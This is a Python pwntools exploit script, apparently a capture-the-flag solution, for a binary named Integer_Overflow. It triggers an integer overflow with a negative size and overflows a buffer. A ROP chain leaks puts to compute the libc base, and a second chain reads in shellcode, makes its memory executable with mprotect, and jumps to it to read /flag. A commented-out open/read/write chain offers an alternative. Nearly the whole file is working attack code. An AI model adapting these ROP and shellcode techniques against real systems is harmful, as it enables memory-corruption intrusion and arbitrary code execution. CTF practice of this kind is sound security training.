from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = process('./Integer_Overflow')
elf = ELF('./Integer_Overflow')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

rdi = 0x401303
ret = 0x40101a

debug('b *0x40122D')

sla(b'size?\n', str(-1))
sa(b'>>\n', b'a'*0x10 + p64(rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln']))
libc_base = l64() - libc.sym['puts']

rax = libc_base + 0x45eb0
rsi = libc_base + 0x2be51
rdx_r12 = libc_base + 0x11f497
open_ = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
mprotect = libc_base + libc.sym['mprotect']
gets = libc_base + libc.sym['gets']

flag = 0x4040A0
buf = 0x4040A0 + 0x10

'''
payload = b'a'*0x10
# set /flag -> flag
payload += p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(0x8)*2 + p64(read)
# open('/flag', 0, 0)
payload += p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0)*2 + p64(open_)
# read(3, buf, 0x30)
payload += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx_r12) + p64(0x30)*2 + p64(read)
# write(1, buf, 0x30)
payload += p64(rdi) + p64(1) + p64(write)
'''

payload = b'a'*0x10
# set shellcode -> buf
payload += p64(rdi) + p64(0) + p64(rsi) + p64(buf) + p64(rdx_r12) + p64(0x100)*2 + p64(read)
# mprotect((buf >> 12) << 12, 0x1000, 7)
payload += p64(rdi) + p64((buf >> 12) << 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7)*2 + p64(mprotect)
# jmp shellcode_addr
payload += p64(buf)


sla(b'size?\n', str(-1))
sa(b'>>\n', payload)

sleep(3)

sl(asm(shellcraft.cat('/flag')))

lg('libc_base', libc_base)
pause()
inter()